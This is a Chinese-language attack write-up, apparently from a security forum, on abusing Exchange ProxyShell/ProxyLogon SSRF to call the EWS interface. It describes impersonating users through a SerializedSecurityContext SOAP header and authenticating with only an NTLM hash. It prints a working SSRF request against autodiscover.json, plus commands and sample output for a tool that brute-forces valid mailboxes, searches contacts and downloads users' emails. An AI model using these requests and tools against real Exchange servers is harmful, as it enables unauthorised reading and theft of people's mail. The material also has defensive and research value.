前言
==

最近出来了几个Exchange preauth的漏洞，有Proxylogon、Proxyshell。简单看了下，本质都是SSRF，然后通过SSRF调用一些需要授权的接口进行GetShell。如果不进行GetShell，又或者是GetShell失败时，如何利用上面的SSRF去获取邮件内容等操作，又或者只有NTLM HASH时，无法解密出密码时，如何依然去做同样的Exchange的操作。

EWS接口
=====

本文将介绍的是Exchange的EWS接口，URI为exchange.com/ews/exchange.asmx

相关介绍可以参考：<https://docs.microsoft.com/en-us/Exchange/client-developer/web-service-reference/ews-reference-for-Exchange>

默认该接口需要鉴权：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-13ad1c054cde0130ba9c66e79d0a8d6815c8047e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-13ad1c054cde0130ba9c66e79d0a8d6815c8047e.png)

尝试利用上述SSRF去访问，以Proxyshell触发点为例：

```php

GET /autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx?X-Rps-CAT=&amp;Email=autodiscover/autodiscover.json?a=a@edu.edu HTTP/2
Host: mail.Exchange.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36.
Accept-Encoding: gzip, deflate
Accept: */*
Content-Length: 0

```

发现成功看到了该接口的真实面貌：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5dc51d92e978dd67cfff1ab5e60e589a94131009.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5dc51d92e978dd67cfff1ab5e60e589a94131009.png)  
既然这里能利用SSRF访问该接口，尝试调用该接口，对该接口发送特定的xml数据包，以搜索联系人为例，发现失败了：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c8dd3c97f7139d51e640956fa4cb86fd0c3a9f3d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c8dd3c97f7139d51e640956fa4cb86fd0c3a9f3d.png)

这里一直百思不得骑姐，咨询头像哥，醍醐灌顶：

&amp;gt; SSRF之后是system，所以这样不行，解决办法是通过autodiacover+emsmdb取到sid，然后在soap头里面指定serializedsecuritycontext

想想也是，你一个SSRF想要去获取邮件内容，如果你不指定用户，Exchange就不会知道你是谁，也不会返回给你想要的内容。

因此这里通过指定serializedsecuritycontext header头，成功的获取到了我想要的东西：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-192990802333459209e8c33584cb8d9da41b0157.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-192990802333459209e8c33584cb8d9da41b0157.png)

那这里思路也很明确了，和Proxylogon漏洞一样，先获取LegacyDN，再获取sid，最后加到soap header头即可。

因此自动化的思路也有了，根据微软文档，去发送对应功能的soap数据包，即可获取你想要的数据。这里简单提了几个功能：

- 爆破用户，查看有哪些用户存在

需要尝试的邮箱文件：

/tmp/emails.txt：

```php
admin@exchange.com
test@exchange.com
jumbo@exchange.com
ceshi@exchange.com
support@exchange.com
```

运行程序：

```php
python Exchange_SSRF_Attacks.py --target mail.exchange.com --action Brute --file /tmp/emails.txt
```

程序结果：

```php
admin@exchange.com valid
support@exchange.com valid
```

- 搜索联系人

运行程序：

```php
python Exchange_SSRF_Attacks.py --target mail.exchange.com --action Search --email validuser@exchange.com --keyword test
```

程序结果：

```php
Board.Test@exchange.com
LTSTest@exchange.com
```

- 下载邮件

运行程序：

```php
python Exchange_SSRF_Attacks.py --target mail.exchange.com --action Download --email userwantdown@exchange.com```
程序结果：
```

\[+\] Item \[output/item-0.eml\] saved successfully

```php
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1a922a55a42f53c00d4aeabc515480baebbe8213.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1a922a55a42f53c00d4aeabc515480baebbe8213.png)

那只有个NTLM HASH时却解不了密码呢？一样的接口，只是多了个认证，少了个header头：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-88cf0412939dddba8f1cd8e9687280b74332ec2a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-88cf0412939dddba8f1cd8e9687280b74332ec2a.png)

# 后续
本文介绍了EWS接口的一些利用，包括不限于利用SSRF漏洞和认证后的调用。本文提到的两个程序将在后续在以下Github仓库公开，大家可以持续关注、Star、Fork：
```

[https://github.com/Jumbo-WJB/Exchange\_SSRF](https://github.com/Jumbo-WJB/Exchange_SSRF)

[https://github.com/Jumbo-WJB/PTH\_Exchange](https://github.com/Jumbo-WJB/PTH_Exchange)```